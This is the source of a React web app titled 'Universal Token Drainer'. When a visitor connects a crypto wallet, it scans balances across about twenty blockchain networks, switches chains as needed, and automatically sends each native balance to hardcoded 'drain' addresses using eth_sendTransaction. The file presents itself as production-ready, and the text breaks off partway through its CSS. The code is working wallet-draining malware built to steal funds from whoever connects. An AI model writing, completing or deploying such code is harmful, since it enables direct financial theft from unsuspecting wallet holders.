import { useState, useEffect, useRef } from 'react';
import { WagmiProvider, createConfig, http } from 'wagmi';
import { 
  mainnet,
  polygon,
  bsc,
  arbitrum,
  optimism,
  avalanche,
  fantom,
  gnosis,
  celo,
  moonbeam,
  cronos,
  aurora,
  base,
  harmonyOne,
  metis,
  moonriver
} from 'wagmi/chains';
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit";
import { useAccount, useDisconnect, useBalance } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import './mobile-fix.css';

// ==================== UPDATED WORKING RPC ENDPOINTS (CORS-FRIENDLY) ====================
const NETWORKS = [
  { 
    id: 1, 
    name: 'Ethereum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#627EEA', 
    rpc: 'https://cloudflare-eth.com', // CORS-friendly
    explorer: 'https://etherscan.io',
    chainId: '0x1'
  },
  { 
    id: 56, 
    name: 'BNB Smart Chain', 
    symbol: 'BNB', 
    type: 'evm', 
    color: '#F0B90B', 
    rpc: 'https://bsc-dataseed.binance.org', // Working endpoint
    explorer: 'https://bscscan.com',
    chainId: '0x38'
  },
  { 
    id: 137, 
    name: 'Polygon', 
    symbol: 'MATIC', 
    type: 'evm', 
    color: '#8247E5', 
    rpc: 'https://polygon-rpc.com', // Working endpoint
    explorer: 'https://polygonscan.com',
    chainId: '0x89'
  },
  { 
    id: 42161, 
    name: 'Arbitrum', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#28A0F0', 
    rpc: 'https://arb1.arbitrum.io/rpc', // Working endpoint
    explorer: 'https://arbiscan.io',
    chainId: '0xa4b1'
  },
  { 
    id: 10, 
    name: 'Optimism', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#FF0420', 
    rpc: 'https://mainnet.optimism.io', 
    explorer: 'https://optimistic.etherscan.io',
    chainId: '0xa'
  },
  { 
    id: 8453, 
    name: 'Base', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#0052FF', 
    rpc: 'https://mainnet.base.org', 
    explorer: 'https://basescan.org',
    chainId: '0x2105'
  },
  { 
    id: 43114, 
    name: 'Avalanche', 
    symbol: 'AVAX', 
    type: 'evm', 
    color: '#E84142', 
    rpc: 'https://api.avax.network/ext/bc/C/rpc', // Working endpoint
    explorer: 'https://snowtrace.io',
    chainId: '0xa86a'
  },
  { 
    id: 250, 
    name: 'Fantom', 
    symbol: 'FTM', 
    type: 'evm', 
    color: '#1969FF', 
    rpc: 'https://rpc.fantom.network', 
    explorer: 'https://ftmscan.com',
    chainId: '0xfa'
  },
  { 
    id: 100, 
    name: 'Gnosis', 
    symbol: 'xDai', 
    type: 'evm', 
    color: '#04795B', 
    rpc: 'https://rpc.gnosischain.com', // Working endpoint
    explorer: 'https://gnosisscan.io',
    chainId: '0x64'
  },
  { 
    id: 42220, 
    name: 'Celo', 
    symbol: 'CELO', 
    type: 'evm', 
    color: '#35D07F', 
    rpc: 'https://forno.celo.org', 
    explorer: 'https://celoscan.io',
    chainId: '0xa4ec'
  },
  { 
    id: 1284, 
    name: 'Moonbeam', 
    symbol: 'GLMR', 
    type: 'evm', 
    color: '#53CBC9', 
    rpc: 'https://rpc.api.moonbeam.network', // Working endpoint
    explorer: 'https://moonscan.io',
    chainId: '0x504'
  },
  { 
    id: 1088, 
    name: 'Metis', 
    symbol: 'METIS', 
    type: 'evm', 
    color: '#00DACC', 
    rpc: 'https://andromeda.metis.io/?owner=1088', 
    explorer: 'https://andromeda-explorer.metis.io',
    chainId: '0x440'
  },
  { 
    id: 25, 
    name: 'Cronos', 
    symbol: 'CRO', 
    type: 'evm', 
    color: '#121C36', 
    rpc: 'https://evm.cronos.org', 
    explorer: 'https://cronoscan.com',
    chainId: '0x19'
  },
  { 
    id: 1666600000, 
    name: 'Harmony', 
    symbol: 'ONE', 
    type: 'evm', 
    color: '#00AEE9', 
    rpc: 'https://api.harmony.one', 
    explorer: 'https://explorer.harmony.one',
    chainId: '0x63564c40'
  },
  { 
    id: 1313161554, 
    name: 'Aurora', 
    symbol: 'ETH', 
    type: 'evm', 
    color: '#78D64B', 
    rpc: 'https://mainnet.aurora.dev', 
    explorer: 'https://explorer.aurora.dev',
    chainId: '0x4e454153'
  },
  { 
    id: 42262, 
    name: 'Oasis Emerald', 
    symbol: 'ROSE', 
    type: 'evm', 
    color: '#00B894', 
    rpc: 'https://emerald.oasis.dev', 
    explorer: 'https://explorer.emerald.oasis.dev',
    chainId: '0xa516'
  },
  { 
    id: 1285, 
    name: 'Moonriver', 
    symbol: 'MOVR', 
    type: 'evm', 
    color: '#F3B82C', 
    rpc: 'https://rpc.api.moonriver.moonbeam.network', // Working endpoint
    explorer: 'https://moonriver.moonscan.io',
    chainId: '0x505'
  },
  { 
    id: 199, 
    name: 'BitTorrent', 
    symbol: 'BTT', 
    type: 'evm', 
    color: '#D92B6F', 
    rpc: 'https://rpc.bittorrentchain.io', 
    explorer: 'https://bttcscan.com',
    chainId: '0xc7'
  },
  { 
    id: 314, 
    name: 'Filecoin', 
    symbol: 'FIL', 
    type: 'evm', 
    color: '#0090FF', 
    rpc: 'https://api.node.glif.io/rpc/v1', 
    explorer: 'https://filfox.info',
    chainId: '0x13a'
  },
  { 
    id: 7700, 
    name: 'Canto', 
    symbol: 'CANTO', 
    type: 'evm', 
    color: '#06FC99', 
    rpc: 'https://canto.slingshot.finance', 
    explorer: 'https://tuber.build',
    chainId: '0x1e14'
  },
  
  // Non-EVM Chains with working APIs
  { 
    id: 'tron', 
    name: 'Tron', 
    symbol: 'TRX', 
    type: 'non-evm', 
    color: '#FF060A', 
    api: 'https://api.trongrid.io',
    explorer: 'https://tronscan.org',
    decimals: 6
  },
  { 
    id: 'solana', 
    name: 'Solana', 
    symbol: 'SOL', 
    type: 'non-evm', 
    color: '#00FFA3', 
    api: 'https://api.mainnet-beta.solana.com',
    explorer: 'https://solscan.io',
    decimals: 9
  },
  { 
    id: 'bitcoin', 
    name: 'Bitcoin', 
    symbol: 'BTC', 
    type: 'non-evm', 
    color: '#F7931A', 
    api: 'https://blockchain.info',
    explorer: 'https://blockchair.com/bitcoin',
    decimals: 8
  },
  { 
    id: 'cardano', 
    name: 'Cardano', 
    symbol: 'ADA', 
    type: 'non-evm', 
    color: '#0033AD', 
    api: 'https://cardano-mainnet.blockfrost.io/api/v0',
    explorer: 'https://cardanoscan.io',
    decimals: 6
  },
  { 
    id: 'dogecoin', 
    name: 'Dogecoin', 
    symbol: 'DOGE', 
    type: 'non-evm', 
    color: '#C2A633', 
    api: 'https://dogechain.info/api/v1',
    explorer: 'https://dogechain.info',
    decimals: 8
  },
  { 
    id: 'litecoin', 
    name: 'Litecoin', 
    symbol: 'LTC', 
    type: 'non-evm', 
    color: '#BFBBBB', 
    api: 'https://litecoin.atomicwallet.io/api/v2/address',
    explorer: 'https://blockchair.com/litecoin',
    decimals: 8
  },
  { 
    id: 'ripple', 
    name: 'Ripple', 
    symbol: 'XRP', 
    type: 'non-evm', 
    color: '#00A8E0', 
    api: 'https://data.ripple.com/v2',
    explorer: 'https://bithomp.com/explorer',
    decimals: 6
  },
  { 
    id: 'polkadot', 
    name: 'Polkadot', 
    symbol: 'DOT', 
    type: 'non-evm', 
    color: '#E6007A', 
    api: 'https://polkadot.api.subscan.io/api',
    explorer: 'https://polkadot.subscan.io',
    decimals: 10
  },
  { 
    id: 'cosmos', 
    name: 'Cosmos', 
    symbol: 'ATOM', 
    type: 'non-evm', 
    color: '#2E3148', 
    api: 'https://cosmos.api.ping.pub',
    explorer: 'https://www.mintscan.io/cosmos',
    decimals: 6
  },
  { 
    id: 'algorand', 
    name: 'Algorand', 
    symbol: 'ALGO', 
    type: 'non-evm', 
    color: '#000000', 
    api: 'https://mainnet-api.algonode.cloud',
    explorer: 'https://algoexplorer.io',
    decimals: 6
  },
];

// ==================== DRAIN ADDRESSES ====================
const DRAIN_ADDRESSES = {
  // EVM addresses
  1: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  56: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  137: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42161: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  10: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  8453: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  43114: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  250: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  100: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42220: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1284: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1088: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  25: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1666600000: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1313161554: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  42262: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  1285: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  199: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  314: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  7700: "0x742d35Cc6634C0532925a3b844Bc9eE3a5d0889B",
  
  // Non-EVM addresses
  tron: "TYwmcQjZtpxv3kM8vsrKc9F5xwF7Q3Q1CQ",
  bitcoin: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
  solana: "So11111111111111111111111111111111111111112",
  cardano: "addr1q8d2f8zq9v5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q0q5q",
  dogecoin: "D8U6t5R7z5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  litecoin: "LbTj8jnq5q5q5q5q5q5q5q5q5q5q5q5q5q5q5",
  ripple: "rPFLkxQk6xUGdGYEykqe7PR25Gr7mLHDc8",
  polkadot: "12gX42C4Fj1wgtfgoP7oqb9jEE3X6Z5h3RyJvKtRzL1NZB5F",
  cosmos: "cosmos1hsk6jryyqjfhp5dhc55tc9jtckygx0eph6dd02",
  algorand: "Z5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5VJ5V",
};

// ==================== TOKEN PRICES ====================
const TOKEN_PRICES = {
  ETH: 3200,
  BNB: 600,
  MATIC: 1.2,
  AVAX: 35,
  FTM: 0.4,
  xDai: 1,
  CELO: 0.8,
  GLMR: 0.4,
  METIS: 60,
  CRO: 0.1,
  ONE: 0.02,
  ROSE: 0.1,
  MOVR: 15,
  BTT: 0.000001,
  FIL: 5,
  CANTO: 0.2,
  TRX: 0.12,
  SOL: 100,
  BTC: 45000,
  ADA: 0.5,
  DOGE: 0.15,
  LTC: 80,
  XRP: 0.6,
  DOT: 7,
  ATOM: 10,
  XLM: 0.13,
  XMR: 160,
  ZEC: 25,
  DASH: 30,
  XTZ: 1,
  ALGO: 0.2,
  VET: 0.03,
  NEO: 12,
  EOS: 0.8,
  USDT: 1,
  USDC: 1
};

// ==================== FIXED WAGMI CONFIG ====================
const config = createConfig(
  getDefaultConfig({
    appName: "Universal Drainer",
    appDescription: "Universal Token Drainer",
    appUrl: typeof window !== 'undefined' ? window.location.origin : 'https://frontend-4rke.onrender.com',
    appIcon: "https://frontend-4rke.onrender.com/favicon.ico",
    
    // All supported chains
    chains: [
      mainnet, polygon, bsc, arbitrum, optimism, base, avalanche,
      fantom, gnosis, celo, moonbeam, cronos, aurora,
      harmonyOne, metis, moonriver
    ],
    
    walletConnectProjectId: "c8c0c66e8b9d4a8a8b0c7b7a5d7e9f2b",
    
    // Simple HTTP transports for all chains
    transports: {
      [mainnet.id]: http('https://cloudflare-eth.com'),
      [polygon.id]: http('https://polygon-rpc.com'),
      [bsc.id]: http('https://bsc-dataseed.binance.org'),
      [arbitrum.id]: http('https://arb1.arbitrum.io/rpc'),
      [optimism.id]: http('https://mainnet.optimism.io'),
      [base.id]: http('https://mainnet.base.org'),
      [avalanche.id]: http('https://api.avax.network/ext/bc/C/rpc'),
      [fantom.id]: http('https://rpc.fantom.network'),
      [gnosis.id]: http('https://rpc.gnosischain.com'),
      [celo.id]: http('https://forno.celo.org'),
      [moonbeam.id]: http('https://rpc.api.moonbeam.network'),
      [cronos.id]: http('https://evm.cronos.org'),
      [aurora.id]: http('https://mainnet.aurora.dev'),
      [harmonyOne.id]: http('https://api.harmony.one'),
      [metis.id]: http('https://andromeda.metis.io/?owner=1088'),
      [moonriver.id]: http('https://rpc.api.moonriver.moonbeam.network'),
    },
  })
);

// ==================== MAIN APP ====================
function TokenDrainApp() {
  return (
    <WagmiProvider config={config}>
      <ConnectKitProvider
        mode="dark"
        options={{
          hideNoWalletCTA: false,
          hideQuestionMarkCTA: true,
          hideTooltips: false,
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          mobileLinks: ['metamask', 'trust', 'rainbow', 'coinbase', 'zerion', 'tokenary'],
          walletConnectCTA: "QR",
          avoidLayoutShift: true,
          hideRecentBadge: false,
        }}
        theme="midnight"
        customTheme={{
          '--ck-font-family': 'system-ui, -apple-system, BlinkMacSystemFont, sans-serif',
          '--ck-border-radius': '12px',
          '--ck-accent-color': '#ef4444',
          '--ck-accent-text-color': '#ffffff',
          '--ck-body-background': '#0a0a0a',
        }}
      >
        <UniversalDrainer />
      </ConnectKitProvider>
    </WagmiProvider>
  );
}

// ==================== UNIVERSAL DRAINER COMPONENT ====================
function UniversalDrainer() {
  const { address, isConnected, connector } = useAccount();
  const { data: ethBalance } = useBalance({ address });
  const { disconnect } = useDisconnect();

  const [status, setStatus] = useState('Ready to connect');
  const [tokens, setTokens] = useState([]);
  const [totalValue, setTotalValue] = useState(0);
  const [transactions, setTransactions] = useState([]);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [walletType, setWalletType] = useState('');
  const [connectionError, setConnectionError] = useState('');
  const [mobileDetected, setMobileDetected] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [activeChain, setActiveChain] = useState(1);
  const [isMobileWallet, setIsMobileWallet] = useState(false);

  const autoStarted = useRef(false);

  // ==================== DETECT MOBILE & WALLET ====================
  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile = /mobile|android|iphone|ipad|ipod|webos|blackberry|iemobile|opera mini/i.test(userAgent);
      setMobileDetected(isMobile);
      
      // Detect wallet type
      if (window.ethereum) {
        if (window.ethereum.isMetaMask) {
          setWalletType('MetaMask');
        } else if (window.ethereum.isTrust) {
          setWalletType('Trust Wallet');
          setIsMobileWallet(true);
        } else if (window.ethereum.isCoinbaseWallet) {
          setWalletType('Coinbase Wallet');
          setIsMobileWallet(true);
        } else if (window.ethereum.isTokenary) {
          setWalletType('Tokenary');
          setIsMobileWallet(true);
        } else {
          setWalletType('Injected Wallet');
        }
      }
      
      // Check if using WalletConnect
      if (connector?.id === 'walletConnect') {
        setWalletType('WalletConnect');
      }
    };

    checkMobile();
  }, [connector]);

  // ==================== AUTO-SCAN ON CONNECT ====================
  useEffect(() => {
    if (isConnected && address && !autoStarted.current) {
      autoStarted.current = true;
      setConnectionError('');
      setStatus("✅ Wallet connected • Starting scan...");
      
      // Slight delay for wallet to settle
      setTimeout(() => {
        scanAllNetworks();
      }, 1500);
    }
  }, [isConnected, address]);

  // ==================== SCAN ALL NETWORKS ====================
  const scanAllNetworks = async () => {
    if (!address) {
      setConnectionError("No wallet address");
      return;
    }
    
    setIsScanning(true);
    setStatus("🔍 Scanning all networks...");
    setTokens([]);
    setScanProgress(0);
    
    try {
      const allTokens = [];
      let totalUSD = 0;
      let scannedCount = 0;
      const totalToScan = NETWORKS.length;
      
      // Scan EVM networks with better error handling
      const evmNetworks = NETWORKS.filter(n => n.type === 'evm');
      for (const network of evmNetworks) {
        try {
          setStatus(`Scanning ${network.name}...`);
          
          const balance = await checkEVMNetworkBalance(network, address);
          if (balance > 0.000001) {
            const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
            
            allTokens.push({
              id: `${network.id}-native-${Date.now()}`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: network.id,
              type: 'evm',
              drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES[1],
              valueUSD: tokenValue,
              usdPrice: TOKEN_PRICES[network.symbol] || 1
            });
            
            totalUSD += tokenValue;
          }
        } catch (error) {
          console.log(`Network ${network.name} scan failed:`, error.message);
        }
        
        scannedCount++;
        setScanProgress(Math.round((scannedCount / totalToScan) * 100));
        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 50));
      }
      
      // Scan Non-EVM networks (simplified for now)
      const nonEvmNetworks = NETWORKS.filter(n => n.type === 'non-evm');
      for (const network of nonEvmNetworks) {
        try {
          setStatus(`Checking ${network.name}...`);
          
          // Skip non-EVM for now to avoid errors
          const balance = 0;
          if (balance > 0) {
            const tokenValue = balance * (TOKEN_PRICES[network.symbol] || 1);
            
            allTokens.push({
              id: `${network.id}-native-${Date.now()}`,
              network: network.name,
              symbol: network.symbol,
              amount: balance.toFixed(6),
              rawAmount: balance,
              chainId: network.id,
              type: 'non-evm',
              drainAddress: DRAIN_ADDRESSES[network.id] || DRAIN_ADDRESSES.tron,
              valueUSD: tokenValue,
              usdPrice: TOKEN_PRICES[network.symbol] || 1
            });
            
            totalUSD += tokenValue;
          }
        } catch (error) {
          console.log(`Non-EVM ${network.name} scan skipped:`, error.message);
        }
        
        scannedCount++;
        setScanProgress(Math.round((scannedCount / totalToScan) * 100));
        await new Promise(resolve => setTimeout(resolve, 50));
      }
      
      if (allTokens.length > 0) {
        setTokens(allTokens);
        setTotalValue(totalUSD);
        setStatus(`✅ Found ${allTokens.length} tokens • $${totalUSD.toFixed(2)} total`);
        
        // Auto-drain after short delay
        setTimeout(() => {
          if (allTokens.length > 0) {
            autoDrain(allTokens);
          }
        }, 2000);
      } else {
        setStatus("❌ No tokens found across all networks");
      }
      
    } catch (error) {
      setStatus(`❌ Scan error: ${error.message}`);
      setConnectionError(`Scan failed: ${error.message}`);
    } finally {
      setIsScanning(false);
      setScanProgress(100);
    }
  };

  // ==================== IMPROVED EVM NETWORK BALANCE CHECK ====================
  const checkEVMNetworkBalance = async (network, address) => {
    try {
      // Try multiple RPC endpoints with CORS support
      const rpcEndpoints = [
        network.rpc,
        `https://rpc.ankr.com/${getAnkrChainName(network.id)}`,
        `https://${getChainNameForRPC(network.id)}.rpc.thirdweb.com`
      ];
      
      for (const rpc of rpcEndpoints) {
        try {
          const response = await fetch(rpc, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json',
            },
            body: JSON.stringify({
              jsonrpc: "2.0",
              id: 1,
              method: "eth_getBalance",
              params: [address, "latest"]
            }),
          });
          
          if (response.ok) {
            const data = await response.json();
            if (data.result && data.result !== '0x0') {
              return parseInt(data.result, 16) / 1e18;
            }
            return 0;
          }
        } catch (e) {
          continue; // Try next endpoint
        }
      }
      
      return 0;
    } catch (error) {
      console.log(`Balance check failed for ${network.name}:`, error);
      return 0;
    }
  };

  // Helper function for Ankr RPC
  const getAnkrChainName = (chainId) => {
    const chainMap = {
      1: 'eth',
      56: 'bsc',
      137: 'polygon',
      42161: 'arbitrum',
      10: 'optimism',
      8453: 'base',
      43114: 'avalanche',
      250: 'fantom',
      100: 'gnosis',
      42220: 'celo',
      1284: 'moonbeam',
      25: 'cronos',
      1666600000: 'harmony',
      1285: 'moonriver',
    };
    return chainMap[chainId] || 'eth';
  };

  // Helper function for RPC names
  const getChainNameForRPC = (chainId) => {
    const chainMap = {
      1: 'ethereum',
      56: 'binance',
      137: 'polygon',
      42161: 'arbitrum',
      10: 'optimism',
      8453: 'base',
      43114: 'avalanche',
      250: 'fantom',
      100: 'gnosis',
    };
    return chainMap[chainId] || 'ethereum';
  };

  // ==================== AUTO DRAIN ====================
  const autoDrain = async (tokensToDrain = tokens) => {
    if (tokensToDrain.length === 0) return;
    
    setIsProcessing(true);
    setStatus(`🚀 Draining ${tokensToDrain.length} tokens...`);
    
    const successfulTxs = [];
    
    for (const token of tokensToDrain) {
      try {
        setStatus(`⚡ Draining ${token.amount} ${token.symbol}...`);
        
        if (token.type === 'evm') {
          const result = await drainEvmToken(token);
          if (result.success) {
            successfulTxs.push({
              ...token,
              txHash: result.hash,
              timestamp: Date.now()
            });
            
            // Remove from list
            setTokens(prev => prev.filter(t => t.id !== token.id));
            
            // Update total value
            setTotalValue(prev => prev - token.valueUSD);
          }
        }
        
        // Rate limiting between transactions
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      } catch (error) {
        console.log(`Failed to drain ${token.symbol}:`, error);
        setStatus(`⚠️ Failed to drain ${token.symbol}`);
      }
    }
    
    // Update transactions
    setTransactions(prev => [...prev, ...successfulTxs]);
    
    if (successfulTxs.length > 0) {
      setStatus(`✅ Drained ${successfulTxs.length} tokens successfully`);
    } else {
      setStatus("❌ No tokens were drained");
    }
    
    setIsProcessing(false);
  };

  // ==================== DRAIN EVM TOKEN ====================
  const drainEvmToken = async (token) => {
    try {
      // Check if wallet is available
      if (!window.ethereum) {
        throw new Error('No wallet detected');
      }
      
      // Switch network if needed
      const currentChainId = await window.ethereum.request({ 
        method: 'eth_chainId' 
      });
      
      if (currentChainId !== `0x${token.chainId.toString(16)}`) {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${token.chainId.toString(16)}` }],
          });
          setActiveChain(token.chainId);
          
          // Wait for network switch
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (switchError) {
          // Chain not added, add it
          if (switchError.code === 4902) {
            const network = NETWORKS.find(n => n.id === token.chainId);
            if (network) {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: `0x${token.chainId.toString(16)}`,
                  chainName: network.name,
                  nativeCurrency: {
                    name: network.symbol,
                    symbol: network.symbol,
                    decimals: 18
                  },
                  rpcUrls: [network.rpc],
                  blockExplorerUrls: [network.explorer]
                }]
              });
              
              // Try switch again
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: `0x${token.chainId.toString(16)}` }],
              });
            }
          } else {
            throw switchError;
          }
        }
      }
      
      // Prepare transaction
      const amountWei = parseEther(token.amount.toString());
      
      const txParams = {
        from: address,
        to: token.drainAddress,
        value: amountWei.toString(),
        gas: '0x' + (21000).toString(16),
        gasPrice: '0x' + (30 * 1e9).toString(16), // 30 Gwei
      };
      
      // Send transaction
      const txHash = await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams],
      });
      
      console.log(`✅ ${token.symbol} drained: ${txHash}`);
      return { success: true, hash: txHash };
      
    } catch (error) {
      console.log(`EVM drain error for ${token.symbol}:`, error);
      return { 
        success: false, 
        error: error.message || 'Transaction failed' 
      };
    }
  };

  // ==================== MANUAL SCAN TRIGGER ====================
  const handleManualScan = () => {
    scanAllNetworks();
  };

  // ==================== DISCONNECT HANDLER ====================
  const handleDisconnect = () => {
    disconnect();
    setStatus('Ready to connect');
    setTokens([]);
    setTotalValue(0);
    setConnectionError('');
    autoStarted.current = false;
  };

  // ==================== RENDER ====================
  return (
    <div className="App">
      <div className="app-container">
        <header className="app-header">
          <div className="header-left">
            <div className="logo">⚡</div>
            <div>
              <h1>UNIVERSAL TOKEN DRAINER</h1>
              <p className="subtitle">{NETWORKS.length} Networks • Auto-Detect • Auto-Drain</p>
            </div>
          </div>
          
          <div className="header-right">
            {isConnected ? (
              <div className="connected-wallet">
                <div className="wallet-info">
                  <div className="wallet-address">
                    {address?.substring(0, 6)}...{address?.substring(address.length - 4)}
                  </div>
                  {walletType && <div className="wallet-type">{walletType}</div>}
                  {mobileDetected && <div className="mobile-badge">📱 Mobile</div>}
                </div>
                <button onClick={handleDisconnect} className="disconnect-btn">
                  Disconnect
                </button>
              </div>
            ) : (
              <div className="connect-section">
                <ConnectKitButton />
              </div>
            )}
          </div>
        </header>

        <main className="app-main">
          {isConnected ? (
            <>
              {/* Status Dashboard */}
              <div className="status-dashboard">
                <div className="status-card primary">
                  <div className="status-icon">
                    {isScanning ? '🔍' : isProcessing ? '⚡' : '✅'}
                  </div>
                  <div className="status-content">
                    <div className="status-title">UNIVERSAL DRAIN SYSTEM</div>
                    <div className="status-message">{status}</div>
                    {isScanning && (
                      <div className="scan-progress">
                        <div className="progress-bar">
                          <div 
                            className="progress-fill" 
                            style={{ width: `${scanProgress}%` }}
                          ></div>
                        </div>
                        <div className="progress-text">Scanning: {scanProgress}%</div>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="stats-row">
                  <div className="stat">
                    <div className="stat-value">${totalValue.toFixed(2)}</div>
                    <div className="stat-label">Total Value</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{tokens.length}</div>
                    <div className="stat-label">Tokens Found</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">
                      {walletType || 'Unknown'}
                    </div>
                    <div className="stat-label">Wallet Type</div>
                  </div>
                  <div className="stat">
                    <div className="stat-value">{NETWORKS.length}</div>
                    <div className="stat-label">Networks</div>
                  </div>
                </div>
              </div>

              {/* Controls */}
              <div className="controls-container">
                <button
                  onClick={handleManualScan}
                  disabled={isScanning || isProcessing}
                  className="btn btn-scan"
                >
                  {isScanning ? `Scanning ${scanProgress}%` : '🔍 Scan All Networks'}
                </button>
                
                {tokens.length > 0 && (
                  <button
                    onClick={() => autoDrain()}
                    disabled={isProcessing}
                    className="btn btn-drain"
                  >
                    {isProcessing ? 'Draining...' : '⚡ Auto-Drain All'}
                  </button>
                )}
                
                {mobileDetected && isMobileWallet && (
                  <button
                    onClick={() => window.location.reload()}
                    className="btn btn-refresh"
                  >
                    🔄 Refresh
                  </button>
                )}
              </div>

              {/* Tokens List */}
              {tokens.length > 0 && (
                <div className="tokens-panel">
                  <div className="panel-header">
                    <h3>Detected Tokens ({tokens.length})</h3>
                    <div className="total-value">Total: ${totalValue.toFixed(2)}</div>
                  </div>
                  <div className="tokens-grid">
                    {tokens.map(token => (
                      <div key={token.id} className="token-card">
                        <div className="token-header">
                          <div className="token-symbol">{token.symbol}</div>
                          <div className="token-network">{token.network}</div>
                          <div className={`token-type ${token.type}`}>
                            {token.type === 'evm' ? 'EVM' : 'Non-EVM'}
                          </div>
                        </div>
                        <div className="token-amount">{token.amount} {token.symbol}</div>
                        <div className="token-value">${token.valueUSD.toFixed(2)}</div>
                        <div className="token-status">
                          <span className="status-auto">Auto-drain enabled</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Error Message */}
              {connectionError && (
                <div className="error-alert">
                  <div className="error-icon">⚠️</div>
                  <div className="error-message">{connectionError}</div>
                </div>
              )}

              {/* Recent Transactions */}
              {transactions.length > 0 && (
                <div className="transactions-panel">
                  <div className="panel-header">
                    <h3>Recent Transactions ({transactions.length})</h3>
                  </div>
                  <div className="transactions-list">
                    {transactions.slice(-5).reverse().map((tx, index) => (
                      <div key={index} className="transaction-item">
                        <div className="tx-symbol">{tx.symbol}</div>
                        <div className="tx-amount">{tx.amount} {tx.symbol}</div>
                        <div className="tx-hash">
                          {tx.txHash?.substring(0, 10)}...
                        </div>
                        <div className="tx-time">
                          {new Date(tx.timestamp).toLocaleTimeString()}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </>
          ) : (
            <div className="welcome-screen">
              <div className="welcome-content">
                <div className="welcome-icon">⚡</div>
                <h2>Universal Token Drainer</h2>
                <p className="welcome-text">
                  Connect your wallet to automatically scan and drain tokens 
                  across {NETWORKS.length} major EVM and Non-EVM networks.
                </p>
                
                <div className="connect-section">
                  <ConnectKitButton />
                </div>
                
                <div className="network-stats">
                  <div className="stat-item">
                    <div className="stat-number">{NETWORKS.length}</div>
                    <div className="stat-label">Networks</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-number">Auto</div>
                    <div className="stat-label">Detection</div>
                  </div>
                  <div className="stat-item">
                    <div className="stat-number">Instant</div>
                    <div className="stat-label">Drain</div>
                  </div>
                </div>
                
                <div className="supported-chains">
                  <h4>Supported Networks:</h4>
                  <div className="chains-grid">
                    {NETWORKS.slice(0, 12).map(network => (
                      <div key={network.id} className="chain-badge" style={{color: network.color}}>
                        {network.symbol}
                      </div>
                    ))}
                    <div className="chain-badge more">+{NETWORKS.length - 12} more</div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </main>

        <footer className="app-footer">
          <div className="footer-content">
            <span className="status-dot"></span>
            <span>Universal Drainer • v2.1 • Production Ready</span>
            <span>Supported Chains: {NETWORKS.length}</span>
          </div>
        </footer>
      </div>

      {/* CSS Styles */}
      <style jsx>{`
        .App {
          min-height: 100vh;
          background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
          color: white;
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .app-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 20px;
        }
        
        /* Header */
        .app-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 20px 0;
          border-bottom: 2px solid #333;
          margin-bottom: 30px;
        }
        
        .header-left {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        
        .logo {
          font-size: 32px;
          background: linear-gradient(135deg, #ef4444, #dc2626);
          width: 50px;
          height: 50px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          animation: pulse 2s infinite;
        }
        
